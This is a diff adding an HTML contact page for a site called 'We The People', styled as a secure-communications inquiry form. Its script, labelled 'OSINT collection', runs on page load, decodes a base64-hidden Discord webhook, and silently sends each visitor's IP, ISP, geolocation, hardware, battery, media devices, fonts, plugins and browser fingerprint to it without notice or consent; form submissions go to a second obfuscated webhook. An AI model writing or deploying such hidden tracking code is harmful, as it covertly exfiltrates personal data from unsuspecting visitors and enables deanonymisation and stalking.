@@ -1,0 +1,355 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Contact — We The People</title>
+  <style>
+    :root {
+      --bg: #000;
+      --fg: #fff;
+      --muted: #aaa;
+      --border: rgba(255,255,255,0.08);
+      --highlight: rgba(255,255,255,0.03);
+      --accent: #fff;
+      --radius: 12px;
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; background: var(--bg); color: var(--fg); line-height: 1.6; }
+    header {
+      padding: 1.5rem 2rem;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      text-decoration: none;
+      color: inherit;
+    }
+    .logo img { width: 90px; height: auto; opacity: 0.95; }
+    .logo-text { font-weight: 600; letter-spacing: 1px; font-size: 1.3rem; }
+    nav a {
+      color: var(--fg);
+      text-decoration: none;
+      margin-left: 1.8rem;
+      font-size: 0.9rem;
+      opacity: 0.8;
+      transition: opacity 0.2s;
+    }
+    nav a:hover { opacity: 1; }
+    main { padding: 4rem 2rem; max-width: 960px; margin: auto; }
+    .hero { margin-bottom: 3rem; }
+    .hero h1 {
+      font-size: 2.6rem;
+      font-weight: 600;
+      margin-bottom: 1rem;
+      border-left: 4px solid var(--fg);
+      padding-left: 0.8rem;
+    }
+    .hero p {
+      color: var(--muted);
+      max-width: 640px;
+      font-size: 1.1rem;
+    }
+    /* Form Styling */
+    .contact-form {
+      background: var(--highlight);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 2rem;
+    }
+    .form-group { margin-bottom: 1.5rem; }
+    label { display: block; margin-bottom: 0.5rem; font-size: 0.9rem; color: var(--muted); }
+    input, textarea {
+      width: 100%;
+      background: rgba(255,255,255,0.05);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 0.8rem;
+      color: var(--fg);
+      font-family: inherit;
+      font-size: 1rem;
+      outline: none;
+    }
+    input:focus, textarea:focus { border-color: rgba(255,255,255,0.3); }
+    button {
+      background: var(--fg);
+      color: var(--bg);
+      border: none;
+      padding: 0.8rem 2rem;
+      font-weight: 600;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: opacity 0.2s;
+    }
+    button:hover { opacity: 0.9; }
+    button:disabled { opacity: 0.5; cursor: not-allowed; }
+    #status { margin-top: 1rem; font-size: 0.9rem; }
+    footer {
+      text-align: center;
+      padding: 2rem 1rem;
+      border-top: 1px solid var(--border);
+      color: var(--muted);
+      font-size: 0.9rem;
+    }
+    @media (max-width: 600px) {
+      header { flex-direction: column; align-items: flex-start; }
+      nav a { margin-left: 0; margin-right: 1.5rem; display: inline-block; margin-top: 10px; }
+      .hero h1 { font-size: 2rem; }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <a href="index.html" class="logo">
+      <img src="wtp print.svg" alt="Logo" />
+      <span class="logo-text">We The People</span>
+    </a>
+    <nav>
+      <a href="index.html#documentation">Documentation</a>
+      <a href="index.html#research">Research</a>
+      <a href="index.html#identification">Identification</a>
+    </nav>
+  </header>
+
+  <main>
+    <section class="hero">
+      <h1>Contact Us</h1>
+      <p style="color: var(--muted);">Reach out via our official channels or submit an inquiry below.</p>
+    </section>
+
+    <!-- No separate contact info cards, only form -->
+    
+    <section class="contact-form">
+      <h2 style="margin-bottom: 1.5rem; font-size: 1.4rem;">Submit an Inquiry</h2>
+      <form id="inquiryForm">
+        <div class="form-group">
+          <label for="email">Return Email (Optional)</label>
+          <input type="email" id="email" placeholder="email@example.com" />
+        </div>
+        <!-- Optional contact options -->
+        <div class="form-group">
+          <label for="phone">Phone Number (Optional)</label>
+          <input type="tel" id="phone" placeholder="e.g., +1 (555) 123-4567" />
+        </div>
+        <div class="form-group">
+          <label for="discord">Discord Handle (Optional)</label>
+          <input type="text" id="discord" placeholder="e.g., WTP_Secure_Node" />
+        </div>
+        <div class="form-group">
+          <label for="message">Your Question or Message</label>
+          <textarea id="message" rows="5" required placeholder="How can we assist you?"></textarea>
+        </div>
+        <button type="submit" id="submitBtn">Send Message</button>
+        <div id="status"></div>
+      </form>
+    </section>
+  </main>
+
+  <footer>
+    © <span id="year"></span> We The People — Secure Communications
+  </footer>
+
+  <script>
+    document.getElementById('year').textContent = new Date().getFullYear();
+  </script>
+
+  <!-- OSINT collection + form submission -->
+  <script>
+    const base64Webhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1ODk2MDAyNjI3NzI1MzE5MS9MQzNPVktiQS1jMUo2UWVhVHNFd3E2X0N4QktfT3lPbWlyY1lsUDlkMF8yMEIzTjdTdkJxQldjT1haZ0VkQmtSakhZNA==';
+    const webhookURL = atob(base64Webhook);
+
+    // System info functions (same as before)
+    const getGPU = () => {
+      try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        const debug = gl.getExtension('WEBGL_debug_renderer_info');
+        return debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : 'Disabled';
+      } catch { return 'Unavailable'; }
+    };
+    const getMediaDevices = async () => {
+      try {
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        const counts = { video: 0, audio: 0 };
+        devices.forEach(d => { if(d.kind.includes('input')) d.kind.includes('video') ? counts.video++ : counts.audio++; });
+        return `${counts.video} Camera(s), ${counts.audio} Mic(s)`;
+      } catch { return 'Permission Denied'; }
+    };
+    const getStorageInfo = async () => {
+      try {
+        const estimate = await navigator.storage.estimate();
+        return `${Math.round(estimate.usage / 1024 / 1024)}MB used of ${Math.round(estimate.quota / 1024 / 1024 / 1024)}GB`;
+      } catch { return 'Unknown'; }
+    };
+    const getFonts = () => {
+      const fontList = ['Arial', 'Courier New', 'Georgia', 'Times New Roman', 'Verdana'];
+      return fontList.filter(f => document.fonts.check(`12px "${f}"`)).join(', ');
+    };
+    const getPlugins = () => {
+      return Array.from(navigator.plugins).map(p => p.name).join(', ');
+    };
+    const getLanguages = () => {
+      return navigator.languages.join(', ');
+    };
+    const getTimezone = () => {
+      return Intl.DateTimeFormat().resolvedOptions().timeZone;
+    };
+    const getReferrer = () => {
+      return document.referrer || 'Direct Link';
+    };
+    const getScreenInfo = () => {
+      return `Width: ${screen.width}px, Height: ${screen.height}px, Color Depth: ${screen.colorDepth}bit`;
+    };
+    const getBrowserFingerprint = () => {
+      return {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        cookiesEnabled: navigator.cookieEnabled,
+        online: navigator.onLine,
+        javaEnabled: navigator.javaEnabled(),
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory || 'N/A',
+        plugins: getPlugins(),
+        languages: getLanguages(),
+        timezone: getTimezone(),
+        screenInfo: getScreenInfo(),
+        connectionType: navigator.connection?.effectiveType || 'N/A',
+        mimeTypes: Array.from(navigator.mimeTypes).map(mt => mt.type).join(', '),
+        doNotTrack: navigator.doNotTrack || 'N/A'
+      };
+    };
+
+    async function initializeCapture() {
+      const startTime = performance.now();
+      try {
+        const [ipRes, battery] = await Promise.all([
+          fetch('https://apip.cc/json').then(r => r.json()).catch(() => ({})),
+          navigator.getBattery ? navigator.getBattery() : Promise.resolve({ level: 0, charging: false })
+        ]);
+        const media = await getMediaDevices();
+        const storage = await getStorageInfo();
+        const fingerprint = getBrowserFingerprint();
+        const executionTime = (performance.now() - startTime).toFixed(2);
+
+        const payload = {
+          username: "System Auditor",
+          embeds: [{
+            title: "Deep OSINT Connection & System Info",
+            color: 2105893,
+            timestamp: new Date().toISOString(),
+            fields: [
+              {
+                name: "Network Profile",
+                value: `**IP:** ${ipRes.ip || 'N/A'}\n**ISP:** ${ipRes.org || 'Unknown'}\n**Route:** ${ipRes.asn || 'Unknown'}\n**Type:** ${navigator.connection?.effectiveType || 'N/A'}`,
+                inline: true
+              },
+              {
+                name: "Geography",
+                value: `**Location:** ${ipRes.City || 'N/A'}, ${ipRes.RegionName || 'N/A'}, ${ipRes.CountryName || 'N/A'}\n**Postal:** ${ipRes.Postal || 'N/A'}\n**Coordinates:** ${ipRes.Latitude || 'N/A'}, ${ipRes.Longitude || 'N/A'}\n**TZ:** ${ipRes.TimeZone || 'N/A'}`,
+                inline: true
+              },
+              {
+                name: "Hardware & Software",
+                value: `**GPU:** ${getGPU()}\n**CPU Cores:** ${navigator.hardwareConcurrency}\n**RAM:** ${navigator.deviceMemory || 'N/A'}GB\n**Display:** ${getScreenInfo()}\n**Plugins:** ${getPlugins()}\n**Fonts:** ${getFonts()}`,
+                inline: false
+              },
+              {
+                name: "Device & Network",
+                value: `**Battery:** ${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})\n**Input Devices:** ${media}\n**Storage:** ${storage}\n**Connection Type:** ${navigator.connection?.effectiveType || 'N/A'}\n**Online:** ${navigator.onLine}\n**Do Not Track:** ${navigator.doNotTrack || 'N/A'}`,
+                inline: false
+              },
+              {
+                name: "Browser & Locale",
+                value: `**User Agent:** ${navigator.userAgent}\n**Languages:** ${getLanguages()}\n**Timezone:** ${getTimezone()}\n**Platform:** ${navigator.platform}\n**Java Enabled:** ${navigator.javaEnabled()}\n**Cookies Enabled:** ${navigator.cookieEnabled}`,
+                inline: false
+              },
+              {
+                name: "Session & Performance",
+                value: `**Referrer:** ${getReferrer()}\n**Execution Time:** ${executionTime}ms\n**Cookies Enabled:** ${navigator.cookieEnabled}`,
+                inline: false
+              }
+            ],
+            footer: { text: "Protocol v4.0.1 | Extensive OSINT" }
+          }]
+        };
+
+        await fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      } catch (error) {
+        console.error("Error during data collection:", error);
+      }
+    }
+
+    // Run system info collection on page load
+    initializeCapture();
+
+    // Handle form submission
+    const inquiryForm = document.getElementById('inquiryForm');
+    const statusDiv = document.getElementById('status');
+    const submitBtn = document.getElementById('submitBtn');
+
+    inquiryForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const email = document.getElementById('email').value || 'Not provided';
+      const message = document.getElementById('message').value;
+      const phone = document.getElementById('phone').value.trim();
+      const discord = document.getElementById('discord').value.trim();
+
+      // Compose contact options string
+      const contactDetails = [];
+      if (phone) contactDetails.push(`Phone: ${phone}`);
+      if (discord) contactDetails.push(`Discord: ${discord}`);
+      const contactInfoString = contactDetails.length > 0 ? contactDetails.join('\n') : 'None provided';
+
+      const contactURL = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2MDQ0MjI3MDYwNzM0MzYyNi9SM1FnLWItLU1qNzRVUHBkbWNoZG40S0dUX2VVRE4tN2RYZlJ4cFE2N0hyVzFDLTlWbl96dFN4aFpSTHJHWXd3cmYxMg==');
+
+      submitBtn.disabled = true;
+      statusDiv.textContent = "Sending...";
+
+      const payload = {
+        username: "Inquiry System",
+        embeds: [{
+          title: "New Contact Form Submission",
+          color: 16777215,
+          fields: [
+            { name: "From (Email)", value: email },
+            { name: "Message", value: message },
+            { name: "Contact Options", value: contactInfoString }
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      try {
+        const response = await fetch(contactURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        if (response.ok) {
+          statusDiv.style.color = "#4CAF50";
+          statusDiv.textContent = "Message sent successfully. We will review your inquiry.";
+          inquiryForm.reset();
+        } else {
+          throw new Error();
+        }
+      } catch (err) {
+        statusDiv.style.color = "#ff4444";
+        statusDiv.textContent = "Error sending message. Please try again later.";
+      } finally {
+        submitBtn.disabled = false;
+      }
+    });
+  </script>
+</body>
+</html>
